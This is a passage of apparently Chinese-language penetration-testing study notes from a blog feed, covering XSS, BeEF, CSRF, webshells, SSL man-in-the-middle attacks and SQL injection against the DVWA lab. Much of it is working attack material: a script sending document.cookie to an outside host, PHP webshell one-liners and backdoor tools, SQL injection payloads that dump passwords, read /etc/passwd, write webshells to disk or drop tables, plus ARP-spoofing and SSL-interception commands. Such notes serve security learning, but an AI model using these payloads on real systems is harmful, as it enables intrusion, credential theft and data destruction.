class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">http.send(<span class="string">"key="</span>+param);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Xsser</p><ul><li>命令行/图形化工具</li><li>绕过服务器端输入筛选<ul><li>10进制/16进制编码</li><li>unescape()</li></ul></li><li><code>xsser -u “http://1.1.1.1/dvwa/vulnerabilities/&quot; -g &quot;xss_r/?name=&quot; --cookie=&quot;security=low; PHPSESSID=d23e469411707ff8210717e67c521a81&quot; -s -v --reverse-check</code></li><li>–heuristic 检查被过滤的字符</li></ul></li><li>对payload编码，绕过服务器端筛选过滤<br>–Str Use method String.FromCharCode()<br>–Une Use Unescape() function<br>–Mix Mix String.FromCharCode() and Unescape()<br>–Dec Use Decimal encoding<br>–Hex Use Hexadecimal encoding<br>–Hes Use Hexadecimal encoding, with semicolons<br>–Dwo Encode vectors IP addresses in DWORD<br>–Doo Encode vectors IP addresses in Octal<br>–Cem=CEM Try -manually- different Character Encoding Mutations<br>(reverse obfuscation: good) -&gt; (ex: ‘Mix,Une,Str,Hex’)</li><li><p>注入技术（多选）<br>–Coo Cross Site Scripting Cookie injection<br>–Xsa Cross Site Agent Scripting<br>–Xsr Cross Site Referer Scripting<br>–Dcp Data Control Protocol injections<br>–Dom Document Object Model injections<br>–Ind HTTP Response Splitting Induced code<br>–Anchor Use Anchor Stealth payloader (DOM shadows!)<br>–Phpids PHP - Exploit PHPIDS bug (0.6.5) to bypass filters<br>–Doss XSS Denial of service (server) injection<br>–Dos XSS Denial of service (client) injection<br>–B64 Base64 code encoding in META tag (rfc2397)<br>–Onm ONM - Use onMouseMove() event to inject code<br>–Ifr Use <iframe> source tag to inject code</iframe></p></li><li><p>存储型XSS</p><ul><li>长期存储于服务器端</li><li>每次用户访问都会被执行javascript脚本</li></ul></li><li>Name：客户端表单长度限制<ul><li>客户端，截断代理</li></ul></li><li><code>&lt;script src=http://1.1.1.1/a.js&gt;&lt;/script&gt;</code></li><li><p>a.js源码</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">"http://1.1.1.1:88/cookies.php?cookie="</span>+<span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure></li><li><p>DOM型XSS</p><ul><li>一套JS和其他语言可调用的标准的API</li><li><code>&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://192.168.20.8:88/log?&quot;+escape(document.cookie);&lt;/script&gt;</code></li></ul></li></ul><h2 id="BEEF"><a href="#BEEF" class="headerlink" title="BEEF"></a>BEEF</h2><ul><li>浏览器攻击面<ul><li>应用普遍转移到B/S架构，浏览器成为统一客户端程序</li><li>结合社会工程学方法对浏览器进行攻击</li><li>攻击浏览器用户</li><li>通过注入的JS脚本，利用浏览器攻击其他网站</li></ul></li><li>BEEF（Browser exploitation framework)<ul><li>生成、交付payload</li><li>Ruby 语言编写</li><li>服务器端：管理hooked客户端</li><li>客户端：运行于客户端浏览器的JavaScript脚本</li></ul></li><li>攻击手段<ul><li>利用网站XSS漏洞实现攻击</li><li>诱使客户端访问含有hook的伪造站点</li><li>结合中间人攻击注入hook脚本</li></ul></li><li>常见用途<ul><li>键盘记录器</li><li>网络扫描</li><li>浏览器信息收集</li><li>绑定shell</li><li>与metasploit集成</li></ul></li><li>演示页面：<code>http://&lt;IP_BeEF_Server&gt;:3000/demos/basic.html</code></li><li>Details:<ul><li>浏览器、插件版本信息；操作系统信息</li></ul></li><li>Logs:<ul><li>浏览器动作：焦点变化、鼠标点击、信息输入</li></ul></li><li>Commands: 命令模块<ul><li>绿色模块：表示模块适合目标浏览器，并且执行结果被客户端不可见</li><li>红色模块：表示模块不适用于当前用户，有些红色模块也可正常执行</li><li>橙色模块：模块可用，但结果对用户可见（CAM弹窗申请权限等）</li><li>灰色模块：模块未在目标浏览器上测试过</li></ul></li><li>主要模块<ul><li>Browsers</li><li>Exploits</li><li>Host</li><li>Persistence</li><li>Network<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2></li></ul></li><li>Cross-site request forgery</li><li>与XSS经常混淆</li><li>从信任的角度来区分<ul><li>XSS：利用用户对站点的信任</li><li>CSRF：利用站点对已经身份认证的信任</li></ul></li><li>结合社工在身份认证会话过程中实现攻击<ul><li>修改账号密码，个人信息（Email，收货地址）</li><li>发送伪造的业务请求（网银，购物，投票）</li><li>关注他人的社交账号，推送博文</li><li>在用户非自愿，不知情的情况下提交请求</li></ul></li><li>业务逻辑漏洞<ul><li>对关键操作缺少确认机制</li><li>自动扫描程序无法发现此类漏洞</li></ul></li><li>漏洞利用条件<ul><li>被害用户已经完成身份认证</li><li>新请求的提交不需要重新身份认证或确认机制</li><li>攻击者必须了解web APP请求的参数构造</li><li>诱使用户触发攻击的指令（社工）</li></ul></li><li>Burpsuite CSRF PoC generator<ul><li>Post/Get 方法</li></ul></li><li>自动扫描程序的检测方法<ul><li>在请求和响应过程中检查是否存在anti-CSRF token名</li><li>检查服务器是否验证anti-CSRF token的名值</li><li>检查token中可编辑的字符串</li><li>检查referrer头是否可以伪造</li></ul></li><li>对策<ul><li>Captcha</li><li>anti-CSRF token</li><li>Referrer头</li><li>降低会话超时时间</li></ul></li></ul><h2 id="WEBSHELL"><a href="#WEBSHELL" class="headerlink" title="WEBSHELL"></a>WEBSHELL</h2><ul><li><code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;_</code></li><li>中国菜刀</li><li>可能被IDS，AV，WAF，扫描器软件发现查杀</li><li>WeBaCoo(web backdoor cookie)<ul><li>类终端的shell</li><li>编码通信内容通过cookie头传输，隐蔽性较强</li><li>cm:base64编码的命令</li><li>cn:服务器用于返回数据的cookie头的名</li><li>cp:返回信息定界符</li></ul></li><li>生成服务端<ul><li>webacoo -g -o a.php</li></ul></li><li>客户端连接<ul><li>webacoo -t -u <a href="http://1.1.1.1/a.php" target="_blank" rel="noopener">http://1.1.1.1/a.php</a></li></ul></li><li>其他参数</li><li>Weevely<ul><li>隐蔽的类终端PHP webshell</li><li>30多个管理模块<ul><li>执行系统命令，浏览文件系统</li><li>检查服务器常见配置错误</li><li>创建正向，反向TCP SHELL连接</li><li>通过目标计算机代理HTTP流量</li><li>从目标计算机运行端口扫描，渗透内网</li></ul></li><li>支持连接密码</li></ul></li><li>生成服务端<ul><li>weevely generate <password> b.php</password></li><li>/usr/share/weevely/b.php</li></ul></li><li>客户端连接服务器<ul><li>weevely <a href="http://1.1.1.1/b.php" target="_blank" rel="noopener">http://1.1.1.1/b.php</a> <password>id</password></li></ul></li></ul><h2 id="HTTPS攻击"><a href="#HTTPS攻击" class="headerlink" title="HTTPS攻击"></a>HTTPS攻击</h2><ul><li>全站HTTPS正成为潮流趋势</li><li>HTTPS的作用<ul><li>解决的是信息传输过程中数据被篡改，窃取</li><li>加密： 对称，非对称，单项</li></ul></li><li>HTTPS攻击方法<ul><li>降级攻击</li><li>解密攻击（明文，证书伪造）</li><li>协议漏洞，实现方法的漏洞，配置不严格</li></ul></li><li>Secure socket layer<ul><li>保证网络通信安全的加密协议</li><li>1994年由Netscape开发成为统一标准</li><li>1999年TLS（transport layer security）取代SSL v3</li><li>近年来发现的SSL协议漏洞使业界认为其漏洞已不可软件修复<ul><li>Heartbleed</li><li>POODLE</li><li>BEAST</li></ul></li></ul></li><li>TLS当前最新版本</li><li>TLS/SSL HTTPS HTTPS over SSL 通俗上表示同一含义</li><li>SSL/TLS也被用于其他场景的传输通道加密<ul><li>邮件传输（服务器间、客户端与服务器间）</li><li>数据库服务器间</li><li>LDAP身份认证服务器间</li><li>SSL VPN</li><li>远程桌面RDP通信过程中的加密和身份认证</li></ul></li><li>web通信中的SSL<ul><li>公钥证书（受信任的第三方公钥颁发机构签名颁发）</li><li>VeriSign</li><li>Thawte</li><li>GolbalSign</li><li>Symantec</li></ul></li><li>加密过程<ul><li>握手、协商加密算法、获取公钥证书、验证公钥证书、交换会话密钥、加密信息传输</li></ul></li><li>非对称加密算法<ul><li>Diffie-Hellman key exchange</li><li>Rivest Shamir Adleman(RSA)</li><li>Elliptic Curve Cryptography(ECC)</li></ul></li><li>对称加密算法<ul><li>Data Encryption Standard(DES) / 3DES</li><li>Advance Encryption Standard(AES)</li><li>International Data Encryption Algorithm(IDEA)</li><li>Rivest Cipher 4(RC4)<ul><li>WEP,TLS/SSL,RDP,Secure shell</li></ul></li></ul></li><li>单向加密算法（HASH）</li><li>SHA-3 已经设计完成，但尚未广泛使用</li><li>SHA-2 是TLS 1.2 唯一支持的单向加密算法</li><li>碰撞攻击针对单向加密算法<ul><li>两个不同的文件生成相同的HASH值</li></ul></li><li>SSL的弱点<ul><li>SSL是不同的对称，非对称，单向加密算法的组合加密实现（cipher suite）</li><li>服务端为提供更好的兼容性，选择支持大量过时cipher suite</li><li>协商过程中强迫降级加密强度</li><li>现代处理器计算能力可以在可接受的时间内破解过时加密算法</li><li>购买云计算资源破解</li></ul></li><li>Openssl<ul><li>直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite</li><li><code>openssl s_client -connect www.baidu.com:443</code></li><li><code>openssl s_client -tls1_2 -cipher &#39;ECDH-RSA-RC4-SHA&#39; -connect www.taobao.com:443</code><ul><li>密钥交换-身份认证-数据加密-HASH算法</li></ul></li><li><code>openssl s_client -tls1_2 -cipher &quot;NULL,EXPORT,LOW,DES&quot; -connect www.taobao.com:443</code> （协商低安全级别cipher suite）</li><li>可被破解的cipher suite<ul><li>openssl ciphers -v “NULL,EXPORT,LOW,DES”</li></ul></li></ul></li><li><code>https://www.openssl.org/docs/apps/ciphers.html</code></li><li>Openssl 需要大量密码学相关知识，命令复杂，结果可读性差</li><li>SSLScan<ul><li>自动识别SSL配置错误、过期协议、过时cipher suite和hash算法</li><li>默认会检查crime，heart bleed漏洞</li><li>绿色表示安全，红色黄色需要引起注意</li><li>TLS支持的cipher suite<ul><li><code>sslscan --tlsall www.taobao.com:443</code></li></ul></li><li>分析证书详细信息<ul><li><code>sslscan --show-certificate --no-ciphersuites www.taobao.com:443</code></li></ul></li></ul></li><li>SSLyze<ul><li>Python语言编写</li><li>检查SSL过时版本</li><li>检查存在弱点的cipher suite</li><li>扫描多站点时，支持来源文件</li><li>检查是否支持会话恢复</li><li><code>sslyze --regular www.taobao.com:443</code></li></ul></li><li>Nmap<ul><li><code>nmap --script=ssl-enum-ciphers.nse www.taobao.com</code></li></ul></li><li><code>https://www.ssllabs.com/ssltest</code><h3 id="SSL-中间人攻击"><a href="#SSL-中间人攻击" class="headerlink" title="SSL 中间人攻击"></a>SSL 中间人攻击</h3></li><li>攻击者位于客户端和服务器通信链路中<ul><li>ARP</li><li>DHCP</li><li>修改网关</li><li>修改DNS</li><li>修改HOSTS</li><li>ICMP,STP,OSPF</li></ul></li><li>加密流量</li><li>攻击的前提<ul><li>客户端已经信任伪造证书颁发机构</li><li>攻击者控制了核发证书颁发机构</li><li>客户端程序禁止了显示证书错误告警信息</li><li>攻击者已经控制客户端，并强制其信任伪造证书</li></ul></li><li>SSLsplit<ul><li>透明SSL/TLS中间人攻击工具</li><li>对客户端伪装成服务器，对服务器伪装成普通客户端</li><li>伪装服务器需要伪造证书</li><li>支持SSL/TLS加密的SMTP，POP3，FTP等通信中间人攻击</li></ul></li><li>利用openssl生成证书密钥<ul><li><code>openssl genrsa -out ca.key 2048</code></li></ul></li><li>利用私钥签名生成证书<ul><li><code>openssl req -new -x509 -days 1096 -key ca.key -out ca.crt</code></li></ul></li><li>启动路由<ul><li><code>sysctl -w net.ipv4.ip_forward=1</code></li></ul></li><li><p>Iptables端口转发规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -F</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443 #MSA</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 #SMTPS</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443 #IMAPS</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 #POP3S</span><br><span class="line">Iptables -t nat -L</span><br></pre></td></tr></table></figure></li><li><p>ARP欺骗</p><ul><li><code>arpspoof -i eth0 -t 1.1.1.2 -r 1.1.1.1</code></li></ul></li><li>启动SSLsplit<ul><li>mkdir -p test/logdir</li><li><code>sslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></li></ul></li><li>被害者访问taobao,baidu,mail.163.com</li><li>查看日志和浏览器证书及证书报错信息</li><li>安装服务器跟证书之后再次访问</li><li><p>iptables端口转发规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -F</span><br><span class="line">iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080</span><br><span class="line">iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080</span><br></pre></td></tr></table></figure></li><li><p>Mitmproxy</p><ul><li><code>mitmproxy -T --host -w mitmproxy.log</code></li></ul></li><li>SSLstrip<ul><li>与前两种工具不同，将客户端到中间人之间的流量变为明文</li><li>ssltrip -l 8080</li></ul></li><li>thc-ssl-dos<ul><li>SSL协商加密对性能开销增加，大量握手请求会导致拒绝服务</li><li>利用SSL secure renegotiation特性，在单一TCP连接中生成数千个SSL重连请求，造成服务器资源过载</li><li>与流量式拒绝服务攻击不同，thc-ssl-dos可以利用dsl线路打垮30G带宽的服务器</li><li>服务器平均可以处理300次/秒SSL握手请求</li><li>对SMTPS，POP3 等服务同样有效</li></ul></li><li>对策<ul><li>禁用SSL-Renegotiation ,使用 SSL Accelerator</li><li>通过修改thc-ssl-dos代码，可以绕过以上对策</li></ul></li><li>AJAX<ul><li>Asynchronous JavaScript and XML</li><li>是一个概念，而非一种新的编程语言，是一组现有技术的组合</li><li>通过客户端脚本动态更新页面部分内容，而非整个页面</li><li>降低带宽使用，提高速度</li><li>提升用户体验</li><li>后台异步访问</li></ul></li><li>AJAX组件<ul><li>JavaScript: ajax的核心组件，使用XMLHTTPRequest 对象接口向服务器发起请求，接收并处理服务器响应数据</li></ul></li><li>Dynamic HTML(DHTML)<ul><li>早于AJAX出现，通过JavaScript，CSS等在客户端修改HTML页面element，缺点是完全依赖客户端代码修改页面，与服务器的交互由JavaScript applets完成，AJAX的XHR弥补了他的缺点（注册用户）</li></ul></li><li>Document Object Model(DOM)<ul><li>处理html,xml文档对象的框架，DHTML是一个浏览器，DOM作为其一个实现的接口，定义和管理每个页面元素obj的Properties,method,event</li></ul></li><li>基于AJAX的web应用工作流程<ul><li>XMLHTTPRequest API 创建对象xmlhttp进行访问</li><li>XML，JSON，HTML，文本，图片</li><li>多个异步请求独立通信，互不依赖</li><li>AJAX框架<ul><li>JQuery</li><li>Dojo Toolkit </li><li>Google web toolkit(GWT)</li><li>Microsoft AJAX library</li></ul></li></ul></li><li>目前没有通用的AJAX安全最佳实践，其攻击面不为大多数人所知</li><li>AJAX的安全问题<ul><li>多种技术混合，增加了攻击面，每个参数都可能形成独立的攻击过程</li><li>AJAX引擎是个全功能的脚本解释器，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP，但可被绕过</li><li>服务器，客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露</li><li>暴露应用程序逻辑</li></ul></li><li>AJAX对渗透测试的挑战<ul><li>异步请求数量多且隐蔽</li><li>触发AJAX请求的条件无规律</li><li>手动和截断代理爬网可能产生大量遗漏</li></ul></li><li>AJAX爬网工具<ul><li>ZAP</li></ul></li><li>客户端代码审计<ul><li>源码</li><li>firebug</li></ul></li><li>web Service<ul><li>面向服务的架构（service oriented architecture) 便于不同系统集成共享数据和功能</li><li>尤其适合不想暴露数据模型和程序逻辑而访问数据的场景</li><li>无页面</li></ul></li><li>两种类型的web service<ul><li>Simple object access protocol （SOAP）<ul><li>传统的web service 开发方法，xml是唯一的数据交换格式</li><li>要求安全性的应用更多采用</li></ul></li><li>RESTFUL（Representational State Transfer architecture— REST)<ul><li>目前更多被采用的轻量web service, JSON 是首选数据交换格式</li></ul></li></ul></li><li>Web Service 安全考虑<ul><li>使用API key或session token实现和跟踪身份认证</li><li>身份认证由服务器完成，而非客户端</li><li>API key,用户名，Session token 永远不要通过URL发送</li><li>RESTful默认不提供任何安全机制，需要使用SSL/TLS保护传输数据安全</li><li>SOAP 提供强于HTTPS的WS-security机制</li><li>使用OAuth 或 HMAC 进行身份认证，HMAC身份认证使用C/S共享的密钥加密API key</li><li>RESTful应只允许身份认证用户使用PUT，DELETE方法</li><li>使用随机token防止CSRF攻击</li><li>对用户提交参数过滤，建议部署基于严格白名单的方法</li><li>报错消息消毒</li><li>直接对象引用应严格身份验证（电商公司以ID作为主索引）</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>SQL注入笔记</title>
      <link href="/2018/04/21/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/04/21/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入笔记"><a href="#SQL注入笔记" class="headerlink" title="SQL注入笔记"></a>SQL注入笔记</h2><ul><li><p>服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器</p></li><li><p>用户登陆判断</p></li><li><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">user</span>=‘uname<span class="string">' AND password=‘pass‘</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE user=‘name'</span> <span class="keyword">AND</span> <span class="keyword">password</span>=<span class="string">''</span> <span class="keyword">OR</span> <span class="string">''</span>=<span class="string">'‘</span></span><br></pre></td></tr></table></figure></li><li><p>基于报错的检测方法</p><ul><li><code>‘ “ % ( )</code></li></ul></li><li><p>基于布尔的检测</p><ul><li><code>1’ and ‘1’=‘1</code></li><li><code>1’ and ‘1’=‘2</code></li></ul></li><li><p>表列数/显示信息位于哪一列</p><ul><li><code>‘ order by 9--</code><ul><li>select * 时表字段数=查询字段数</li></ul></li></ul></li><li><p>联合查询</p><ul><li><code>’ union select 1,2--+</code></li><li><code>’ union all select database(),2--+</code></li></ul></li><li><p>hash-identifier</p></li><li><p><code>&#39; union select database(),substring_index(USER(),&quot;@&quot;,1)--</code></p></li><li><p>DB用户：<code>user()</code></p></li><li><p>DB版本：<code>version()</code></p></li><li><p>全局函数：<code>@@datadir @@hostname  @@VERSION @@version_compile_os</code></p></li><li><p>当前库：<code>database()</code></p></li><li><p>ASCII转字符：<code>char()</code></p></li><li><p>连接字符串：<code>CONCAT_WS(CHAR(32,58,32),user(),database(),version())</code></p></li><li><p>计算哈希：<code>md5()</code></p></li><li><p>Mysql数据结构</p><ul><li>information_schema</li></ul></li><li><p>所有库所有表/统计每库中表的数量</p></li><li><ul><li><code>‘ union select table_name,table_schema from information_schema.tables--+</code></li><li><code>&#39; UNION select table_schema,count(*) FROM information_Schema.tables group by table_schema --</code></li></ul></li><li><p>DVWA库中的表名</p></li><li><ul><li><code>&#39; union select table_name,table_schema from information_schema.tables where table_schema=&#39;dvwa&#39;--+</code></li></ul></li><li><p>Users表中的所有列（user_id, first_name, last_name, user, password, avator)</p></li><li><ul><li><code>&#39; union select table_name,column_name from information_schema.columns where table_schema=&#39;dvwa&#39; and table_name=&#39;users’--+</code></li></ul></li><li><p>查询user password列的内容</p></li><li><ul><li><code>&#39; union select user,password from dvwa.users--+</code></li><li><code>&#39; union select user,password from users--+</code></li><li><code>&#39; union select null, concat(user,0x3a,password) from users--+</code></li></ul></li><li><p>密码破解</p></li><li><ul><li><code>username:passhash ——&gt; dvwa.txt</code></li><li><code>john --format=raw-MD5 dvwa.txt</code></li></ul></li><li><p>读取文件</p></li><li><ul><li><code>&#39; union SELECT null, load_file(&#39;/etc/passwd&#39;)--+</code></li></ul></li><li><p>写入文件</p></li><li><ul><li><code>&#39; union select null,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot; INTO DUMPFILE &quot;/tmp/a.php&quot; --+</code></li><li>Mysql账号</li><li>文件包含 <code>?page=/tmp/a.php&amp;cmd=ls</code></li><li><code>cat php-revers-shell.php | xxd -ps | tr -d &#39;\n&#39;</code></li><li><code>&#39; union select null, (0x3c3f706870) INTO DUMPFILE &#39;/tmp/x.php&#39;--</code></li></ul></li><li><p>保存下载数据库</p></li><li><ul><li><code>&#39; union select null, concat(user,0x3a,password) from users INTO OUTFILE &#39;/tmp/a.db&#39;--</code></li></ul></li><li><p>一个思路：编写服务器端代码</p></li><li><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,&apos;&lt;?php if(isset($_POST[&quot;submit&quot;])) &#123; $userID = $_POST[&quot;userID&quot;]; $first_name</span><br><span class="line">= $_POST[&quot;first_name&quot;]; $last_name = $_POST[&quot;last_name&quot;]; $username =</span><br><span class="line">$_POST[&quot;username&quot;]; $avatar = $_POST[&quot;avatar&quot;]; echo &quot;userID: $userID&lt;BR&gt;&quot;; echo</span><br><span class="line">&quot;first_name: $first_name&lt;BR&gt;&quot;; echo &quot;last_name: $last_name&lt;BR&gt;&quot;; echo &quot;username:</span><br><span class="line">$username&lt;BR&gt;&quot;; echo &quot;avatar: $avatar&lt;BR&gt;&quot;;</span><br><span class="line">$con=mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;&quot;,&quot;dvwa&quot;); if (mysqli_connect_errno()) &#123; echo</span><br><span class="line">&quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); &#125; else &#123; echo &quot;Connected to</span><br><span class="line">database&lt;BR&gt;&quot;; &#125; $password = &quot;123&quot;; $sql=&quot;insert into dvwa.users values (\\&quot;$userID\\&quot;,\</span><br><span class="line">\&quot;$first_name\\&quot;,\\&quot;$last_name\\&quot;,\\&quot;$username\\&quot;,MD5(\\&quot;$password\\&quot;),\\&quot;$avatar\</span><br><span class="line">\&quot;)&quot;; if (mysqli_query($con,$sql)) &#123; echo &quot;[Successful Insertion]: $sql&quot;; &#125; else &#123; echo &quot;Error</span><br><span class="line">creating database: &quot; . mysqli_error($con); &#125; mysqli_close($con); &#125; ?&gt; &lt;form method=&quot;post&quot;</span><br><span class="line">action=&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;]; ?&gt;&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;userID&quot;</span><br><span class="line">value=&quot;33&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;first_name&quot; value=&quot;fh&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot;</span><br><span class="line">name=&quot;last_name&quot; value=&quot;y&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;yfh&quot;&gt;&lt;br&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;avatar&quot; value=&quot;yfh!&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot;</span><br><span class="line">value=&quot;Submit Form&quot;&gt;&lt;br&gt; &lt;/form&gt;&apos; INTO DUMPFILE &apos;/tmp/user.php&apos; --</span><br></pre></td></tr></table></figure></li></ul></li><li><p>无权读取information_schema库 / 拒绝union, order by 语句</p></li><li><ul><li>猜列名： <code>&#39; and column is null--+</code></li><li><ul><li>burpsuite 自动猜列名</li></ul></li><li>猜当前表表名：<code>&#39; and table.user is null--+</code></li><li>猜库里其他表： <code>&#39; and(select count(*) from table)&gt;0--+</code></li><li>列表对应关系： <code>&#39; and users.user is null--+</code></li><li>猜字段内容： <code>&#39; or user = &#39;admin</code></li><li><code>&#39; or user like &#39; %a%</code></li><li>猜账号对应密码：</li><li><ul><li><code>&#39; or user=&#39;admin&#39; and password=&#39;5f4dcc3b5aa765d61d8327deb882cf99</code></li></ul></li></ul></li><li>当数据库可写</li><li><ul><li><code>&#39;; update users set user=&#39;yy&#39; where user=&#39;admin</code></li><li><ul><li>注入失败，SQL客户端工具的问题</li><li><code>http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html</code></li></ul></li><li><code>&#39;; INSERT INTO users (&#39; user_id&#39;,&#39; first_name&#39;,&#39; last_name&#39;,&#39;user&#39;,&#39;password&#39;,&#39;avatar&#39;) VALUES(‘35&#39;,&#39;yy&#39;,‘y&#39;,‘yyy&#39;,&#39;5f4dcc3b5aa765d61d8327deb882cf99&#39;,&#39;OK&#39;);--+</code></li><li><code>&#39;;DROP TABLE users;--</code></li></ul></li><li>SQLi没有通用的方法，掌握原理，了解各种数据库特性</li><li>Medium难度级别</li><li><ul><li>mysql_real_escape_string()</li><li><ul><li>PHP 4 &gt;= 4.3.0 PHP 5</li><li>PHP5.5.0已经弃用此函数</li><li>PHP7.0.0 已经删除此函数，代之以mysqli,PDO_MySQL</li></ul></li><li>High级别</li><li><ul><li>mysql_real_escape_string()</li><li>stripslashes()</li><li>is_numeric()</li></ul></li></ul></li></ul><h3 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h3><ul><li><p>不显示数据库内建的报错信息</p></li><li><ul><li>内建的报错信息帮助开发人员发现和修复问题</li><li>报错信息提供关于系统的大量有用信息</li></ul></li><li><p>当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，SQL注入将无法依据报错信息判断注入语句的执行结果。</p></li><li><p>思路：既然无法基于报错信息判断结果，基于逻辑真假的不同结果来判断</p></li><li><ul><li><p><code>1 &#39; and 1 = 1--+</code></p></li><li><p><code>1 &#39; and 1=2--+</code></p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,2--+</span><br><span class="line">1&apos; union select null,CONCAT_WS(CHAR(32,58,32),user(),database(),version())--+</span><br><span class="line">1&apos; and 1=0 union select null,table_name from information_schema.tables#</span><br><span class="line">1&apos; and 1=0 union select null,table_name from information_schema.columns where</span><br><span class="line">table_name=&apos;users&apos; #</span><br></pre></td></tr></table></figure></li></ul></li><li><p>无权读取information_schema库 / 拒绝 union \ order by 语句</p></li><li><ul><li>猜列名： <code>1&#39; and user is not null--+</code></li><li>猜当前表表名： <code>1&#39; and table.user is not null--+</code></li><li>猜库里其他表：<code>1&#39; and (select count() from table)&gt;0--+</code></li><li>列表对应关系：<code>1&#39; and users.user is not null--+</code></li><li>猜字段内容： <code>1&#39; and user=&#39;admin</code></li><li><code>1&#39; or user like &#39;%a%</code></li><li>猜账号对应密码：<code>2&#39; or user=&#39;admin&#39; and password=&#39;5f4dcc3b5aa765d61d8327deb882cf99</code></li></ul></li><li><p>开个脑洞</p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and ORD(MID((VERSION()),1,1))&amp;1&gt;0--+</span><br><span class="line">CURRENT_USER()?DATABASE()</span><br><span class="line">MID(ColumnName, Start [, Length])</span><br><span class="line">ORD(string) #ASCII?</span><br></pre></td></tr></table></figure></li></ul><h3 id="SQLMAP-自动注入"><a href="#SQLMAP-自动注入" class="headerlink" title="SQLMAP 自动注入"></a>SQLMAP 自动注入</h3><ul><li><p>开源sql注入漏洞检测，利用工具</p></li><li><p>检测动态页面中get/post参数，cookie, http头</p></li><li><p>数据榨取</p></li><li><p>文件系统访问</p></li><li><p>操作系统命令执行</p></li><li><p>引擎强大，特性丰富</p></li><li><p>XSS漏洞检测</p></li><li><p>五种漏洞检测技术</p></li><li><ul><li>基于布尔的盲注检测</li><li>基于时间的盲注检测</li><li>基于错误的检测</li><li>基于UNION联合查询的检测</li><li><ul><li>适用于通过循环直接输出联合查询结果，否则只显示第一项结果</li></ul></li><li>基于堆叠查询的检测</li><li><ul><li>堆叠多个查询语句</li><li>适用于非select的数据修改，删除的操作</li></ul></li><li>支持的数据库管理系统DBMS</li><li><ul><li>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite,<br>Firebird, Sybase , SAP 